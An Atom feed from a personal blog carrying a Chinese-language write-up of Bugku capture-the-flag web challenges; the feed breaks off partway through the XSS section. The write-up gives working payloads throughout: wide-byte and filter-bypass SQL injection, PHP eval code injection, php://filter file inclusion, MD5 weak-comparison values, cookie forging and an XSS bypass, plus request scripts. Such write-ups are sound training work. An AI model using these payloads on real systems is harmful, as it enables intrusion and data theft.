<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CherryGk&#39;s Blog</title>
  
  <subtitle>Welcome!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-06-16T09:58:21.373Z</updated>
  <id>http://yoursite.com/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>bugku writeup合集(杂项、Web）</title>
    <link href="http://yoursite.com/2018/06/06/bugku/"/>
    <id>http://yoursite.com/2018/06/06/bugku/</id>
    <published>2018-06-06T08:10:51.000Z</published>
    <updated>2018-06-16T09:58:21.373Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>滑稽，F12查看源，得到flag：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/96118525.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="文件上传测试"><a href="#文件上传测试" class="headerlink" title="文件上传测试"></a>文件上传测试</h2><p>题目提示：<br>请上传PHP文件，文件上传大小不允许超过1M<br>试了几次之后，当上传php文件时提示非图片文件，<br>上传图片时，提示非php文件，打开burpsuite，<br>将一个php文件的后缀加上.jpg，上传时将.jpg删掉再上传即可<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/21608635.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>题目给出的输入框限制了最大输入长度，<br>F12将最大长度限制删掉就行.<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/23490301.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>这题有基础的都知道怎么做：<br>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$what=$_GET[&apos;what&apos;];</span><br><span class="line">echo $what;</span><br><span class="line">if($what==&apos;flag&apos;)</span><br><span class="line">echo &apos;flag&#123;****&#125;&apos;;</span><br></pre></td></tr></table></figure></p><p>将what提交了就行<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/28633444.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h2><p>跟上题一样:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/79911845.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$num=$_GET[&apos;num&apos;];</span><br><span class="line">if(!is_numeric($num))</span><br><span class="line">&#123;</span><br><span class="line">echo $num;</span><br><span class="line">if($num==1)</span><br><span class="line">echo &apos;flag&#123;**********&#125;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>代码意思是当num不是个数字并且值等于1的时候输出flag：<br>payload:<code>URL?num=1x31</code><br>提交拿到flag</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>打开的时候阻止页面创建对话框<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/16696183.jpg" alt="" title="" class="">                <p></p>            </figure><br>查看源码，<br>在最底下有串代码<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/31661363.jpg" alt="" title="" class="">                <p></p>            </figure><br>html码得到flag<br>附上<a href="http://www.convertstring.com/zh_CN/EncodeDecode/HtmlDecode" target="_blank" rel="noopener">解码连接</a><br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/50555689.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>这题是宽字节注入：<br>原理：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GBK 占用两字节</span><br><span class="line">ASCII占用一字节</span><br><span class="line">PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），</span><br><span class="line">MYSQL默认字符集是GBK等宽字节字符集。</span><br><span class="line">大家都知道%df’ 被PHP转义，单引号被加上反斜杠\，</span><br><span class="line">变成了 %df\’，其中\的十六进制是 %5C ，</span><br><span class="line">那么现在 %df\’ =%df%5c%27，</span><br><span class="line">如果程序的默认字符集是GBK等宽字节字符集，</span><br><span class="line">则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，</span><br><span class="line">也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</span><br></pre></td></tr></table></figure></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=%df%27 union select 1,string from sql5.key%23</span><br></pre></td></tr></table></figure></p><p>首先，在url栏输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=%df%27</span><br></pre></td></tr></table></figure></p><p>报错了,说明可以注入<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/35293242.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>继续查看可显字段和库名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=%df%27 union select 1,database()%23</span><br></pre></td></tr></table></figure></p><p>告诉你查询key表里id=1的字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=%df%27 union select 1,string from sql5.key%23</span><br></pre></td></tr></table></figure></p><p>得到flag</p><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>hint：<br><code>听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag</code><br>直接改host就行，这里用火狐一个插件直接改访问的host就行<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/24899388.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>直接拿到flag</p><h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>过滤代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//过滤sql</span><br><span class="line">$array = array(&apos;table&apos;,&apos;union&apos;,&apos;and&apos;,&apos;or&apos;,&apos;load_file&apos;,&apos;create&apos;,&apos;delete&apos;,&apos;select&apos;,&apos;update&apos;,&apos;sleep&apos;,&apos;alter&apos;,&apos;drop&apos;,&apos;truncate&apos;,&apos;from&apos;,&apos;max&apos;,&apos;min&apos;,&apos;order&apos;,&apos;limit&apos;);</span><br><span class="line">foreach ($array as $value)</span><br><span class="line">&#123;</span><br><span class="line">if (substr_count($id, $value) &gt; 0)</span><br><span class="line">&#123;</span><br><span class="line">exit(&apos;包含敏感关键字！&apos;.$value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//xss过滤</span><br><span class="line">$id = strip_tags($id);</span><br><span class="line"></span><br><span class="line">$query = &quot;SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1&quot;;</span><br></pre></td></tr></table></figure></p><p>注入的关键词几乎都过滤了，但是看到后面有个xss过滤。<br>查资料发现strip_tags（）函数会去除字符串里的html和php标签，<br>思路是先在payload里插入html标签绕过sql的过滤，<br>然后再用xss的过滤去除html的标签：</p><p>想通之后很简单，就是常规的sql注入,<br>得到数据库名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=-1%20uni%3C%3Eon%20sel%3C%3Eect%201,databa%3C%3Ese()%23</span><br></pre></td></tr></table></figure></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,hash fr&lt;&gt;om sql3.key %23</span><br></pre></td></tr></table></figure></p><p>查找表为key的数据表，id=1值hash字段值，得到flag</p><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>这题是不停的刷新页面，用burpsuite抓包就行：<br>多go几次就能拿到flag：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/8440547.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>括号闭合的思路，payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8003/index.php?hello= 1);print_r(file(&quot;./flag.php&quot;)</span><br></pre></td></tr></table></figure></p><p>在服务器上执行的代码是(var_dump(hello=1);print_r(file(“./flag.php”));//<br>得到flag：<br>flag{bug-ctf-gg-99}</p><p>反括号`在linux下起着命令替换的作用。命令替换是指shell能够将一个命令的标准输出插在一个命令行中任何位置。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost sh]# echo The date is `date` </span><br><span class="line">The date is 2011年 03月 14日 星期一 21:15:43 CST</span><br></pre></td></tr></table></figure></p><p>单引号、双引号用于用户把带有空格的字符串赋值给变量事的分界符。如果没有单引号或双引号，shell会把空格后的字符串解释为命令。<br>单引号和双引号的区别。单引号告诉shell忽略所有特殊字符，而双引号忽略大多数，但不包括$、\、`。<br>例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost tmp]# echo ‘the date is `date`’ </span><br><span class="line">the date is `date` </span><br><span class="line">[root@localhost tmp]# echo “the date is `date`” </span><br><span class="line">the date is Fri Oct 9 00:11:56 CST 2015</span><br></pre></td></tr></table></figure></p><p>eval( “var_dump($a);”);正是双引号！！！我们就可以用`了！<br>然后用cat读取输出即可！</p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>某春秋原题。<br>flag In the variable !<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8004/index1.php?args=GLOBALS</span><br></pre></td></tr></table></figure></p><p><a href="http://blog.csdn.net/qq_35078631/article/details/62438259" target="_blank" rel="noopener">参考资料</a></p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>jsfuck<br>右键查看源代码：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/20293186.jpg" alt="" title="" class="">                <p></p>            </figure><br>复制下来，F12放到控制台回车，得到flag：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/1983962.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>看这个名字就感觉flag在响应头里：<br>F12查看一下响应头，得到flag<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/80220355.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>题目提示查看源代码，<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/16462625.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>进行了URL编码，<br>p1解码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function checkSubmit()&#123;var a%3ddocument.getElementById(&quot;password&quot;)%3bif(&quot;undefined&quot;!%3dtypeof a)&#123;if(&quot;67d709b2b</span><br></pre></td></tr></table></figure></p><p>p2解码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa648cf6e87a7114f1&quot;%3d%3da.value)return!0%3balert(&quot;Error&quot;)%3ba.focus()%3breturn!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit%3dcheckSubmit%3b</span><br></pre></td></tr></table></figure></p><p>大概意思就是提交的值与<br>p1里面那段值加上<code>54aa2</code>再加上p2里的值相同就行<br>拼接起来提交就行：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/48961816.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>点进去，看看URL<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/98855012.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>一个文件包含的题，直接拿php伪协议试：<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8005/post/index.php?file=php://filter//read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><p>base64解码之后得到flag：<br>flag{edulcni_elif_lacol_si_siht}</p><h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><p>输入5位数密码，直接爆破<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/41498063.jpg" alt="" title="" class="">                <p></p>            </figure><br>得到flag</p><h2 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h2><p>查看源代码:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/38810373.jpg" alt="" title="" class="">                <p></p>            </figure><br>当clicks大于1000000时，能拿到flag<br>F12控制台输入clicks=100000000000回车即可得到flag</p><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>备份文件获取，将<code>index.php.bak</code>下载下来，<br>查看源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);</span><br><span class="line">$str = substr($str,1);</span><br><span class="line">$str = str_replace(&apos;key&apos;,&apos;&apos;,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line">echo md5($key1);</span><br><span class="line"></span><br><span class="line">echo md5($key2);</span><br><span class="line">if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    echo $flag.&quot;取得flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>php弱类型比较，在url栏输入：</p><p><code>URL?key1=QNKCDZO&amp;key2=240610708</code></p><p>发现没啥反应，然后看了看源码，发现过滤了<code>key</code><br>双写key绕过，提交得到flag<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web16/index.php?kekeyy1=QNKCDZO&amp;kkeyey2=240610708</span><br></pre></td></tr></table></figure></p><h2 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h2><p>直接访问：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/12155851.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>很明显是算不到这么快的。<br>只能写脚本了。<br>附上python脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &apos;http://120.24.86.145:8002/qiumingshan/&apos;</span><br><span class="line">s = requests.Session()</span><br><span class="line">source = s.get(url)</span><br><span class="line">expression = re.search(r&apos;(\d+[+\-*])+(\d+)&apos;, source.text).group()</span><br><span class="line">result = eval(expression)</span><br><span class="line">post = &#123;&apos;value&apos;: result&#125;</span><br><span class="line">print(s.post(url, data = post).text)</span><br></pre></td></tr></table></figure></p><p>这里有个正则匹配来匹配给出的表达式，<br>然后直接用eval计算。<br>最后将<code>value</code> <code>post</code>即可得到flag，<br>但是计算出的表达式长度不一样，可能会超过php的最大长度<br>所以需要多试几遍。<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/19420139.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>打开来什么都没有，就是一个你得快点：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/86374868.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>查看源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- OK ,now you have to post the margin what you find --&gt;</span><br></pre></td></tr></table></figure></p><p>有一段提示，<code>post</code> <code>margin</code>变量what i find<br>打开bp抓包：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/87281166.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>响应头中有个flag,<br>base64之后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跑的还不错，给你flag吧: NjM4NzUy</span><br></pre></td></tr></table></figure></p><p>估计是把 <code>NjM4NzUy</code>提交上去就行了,<br>但是后面发现还得把<code>NjM4NzUy</code>解一次base64：<code>638752</code><br>这个后面再说原因。<br>直接上python脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import re</span><br><span class="line">url=&apos;http://120.24.86.145:8002/web6/&apos;</span><br><span class="line">a=requests.session()</span><br><span class="line">r=a.get(url)</span><br><span class="line">FLAG=r.headers[&apos;flag&apos;]</span><br><span class="line">p=re.match(&apos;(.*)(: )(.*)&apos;,base64.b64decode(FLAG))</span><br><span class="line">payload=&#123;&apos;margin&apos;:base64.b64decode(p.group(3))&#125;</span><br><span class="line">r=a.post(url,data=payload)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></p><p>得到flag:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/21828555.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>这里可以看到我的脚本用了两次base64，<br>如果只用一次的话，题目会提示<code>你需要再快点</code>，具体的这里就不试了<br>同时给出php的脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = &quot;http://120.24.86.145:8002/web6/&quot;;</span><br><span class="line">    $contents = file_get_contents($url);</span><br><span class="line">    $header_arr = get_headers($url);</span><br><span class="line">    $cookie = $header_arr[5];</span><br><span class="line">    $cookie = explode(&apos;:&apos;,$cookie)[1];</span><br><span class="line">    $cookie = explode(&apos;;&apos;,$cookie)[0];</span><br><span class="line"></span><br><span class="line">    $flag = $header_arr[9];</span><br><span class="line">    $flag = explode(&apos;:&apos;,$flag)[1];</span><br><span class="line"></span><br><span class="line">    $flag = base64_decode($flag);</span><br><span class="line">    $flag = explode(&apos;: &apos;,$flag)[1];</span><br><span class="line">    $flag = base64_decode($flag);</span><br><span class="line"></span><br><span class="line">    $post_data = array(&quot;margin&quot;=&gt;$flag);</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);</span><br><span class="line">    curl_setopt($ch,CURLOPT_COOKIE,$cookie);</span><br><span class="line">    curl_setopt($ch,CURLOPT_POSTFIELDS,$post_data);</span><br><span class="line">    $output = curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line"> </span><br><span class="line">    print_r($output);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h2 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a>cookies欺骗</h2><p>打开题目看到一堆乱码，<br>但是URL栏看到那个<code>filename</code>，估计是个base64，<br>解码之后果然：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/35684580.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>但是前面还有个参数<code>line</code>，行的意思，一开始不知道这个参数有什么用，<br>多试了几次：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web11/index.php?line=0&amp;filename=a2V5cy50eHQ=</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/55573167.jpg" alt="" title="" class="">                <p></p>            </figure><p>当<code>line</code>=0，1，2等数的时候，对应着文件的0，1，2行<br>所以这个时候我们要做的是就是把<code>index.php</code>这个文件读到，<br>首先将<code>index.php</code>base64转码：<code>aW5kZXgucGhw</code><br>然后写个脚本将<code>line</code>从0~40遍历一次，<br>附上php脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$url1 = &quot;http://120.24.86.145:8002/web11/index.php?line=&quot;;</span><br><span class="line">$url2 = &quot;&amp;filename=aW5kZXgucGhw&quot;;</span><br><span class="line"></span><br><span class="line">for ($i=0; $i &lt; 40; $i++) &#123; </span><br><span class="line"></span><br><span class="line">$url = $url1.$i.$url2;</span><br><span class="line"></span><br><span class="line">$contents = file_get_contents($url);</span><br><span class="line">echo $contents;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>python脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf8</span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url1 = &quot;http://120.24.86.145:8002/web11/index.php?line=&quot;</span><br><span class="line">url2 = &quot;&amp;filename=aW5kZXgucGhw&quot;;</span><br><span class="line">for i in range(40):</span><br><span class="line">   url=url1+str(i)+url2</span><br><span class="line">   ans = requests.get(url)</span><br><span class="line">   print(ans.text)</span><br></pre></td></tr></table></figure></p><p>脚本运行之后得到的源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0); </span><br><span class="line">$file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;); </span><br><span class="line">$line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0; </span><br><span class="line">if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;); </span><br><span class="line">$file_list = array( </span><br><span class="line">&apos;0&apos; =&gt;&apos;keys.txt&apos;, </span><br><span class="line">&apos;1&apos; =&gt;&apos;index.php&apos;, </span><br><span class="line">); </span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&apos;margin&apos;]) &amp;&amp; $_COOKIE[&apos;margin&apos;]==&apos;margin&apos;)&#123; </span><br><span class="line">$file_list[2]=&apos;keys.php&apos;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if(in_array($file, $file_list))&#123; </span><br><span class="line">$fa = file($file); </span><br><span class="line">echo $fa[$line]; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>看到源码之后，当存在<code>cookie:margin</code>且等于<code>margin</code>的时候，<br>才能读keys.php的源码,<br>拿bp改个包，并且将文件名参数发送为keys.php转码后的值发送即可得到flag:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/61360232.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="XSS注入"><a href="#XSS注入" class="headerlink" title="XSS注入"></a>XSS注入</h2><p>题目提示必须包含<code>alert(_key_)</code>，所以先提交:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL?id=&lt;script&gt;alert(_key_)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>但是没有给出flag，查看源代码：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/71611277.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>可以看到此时s里的内容<code>&lt;</code> <code>&gt;</code>已经被转义成了<code>&amp;lt</code> <code>&amp;gt</code>,<br>所以如果要得到flag，必须先绕过过滤：<br>Unicode编码绕过,<a href="http://www.360doc.com/content/16/0308/12/2340477_540447147.shtml" target="_blank" rel="noopener">查看原理</a></p><p>用<code>\u003c</code>和<code>\u003e</code>来代替<code>&lt;</code> <code>&gt;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL?id=\u003cscript\u003e alert(_key_)\u003c/script\u003e</span><br></pre></td></tr></table></figure><p>替换之后没有弹窗，但是在源代码里可以看到flag:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/83372728.jpg" alt="" title="" class="">                <p></p>            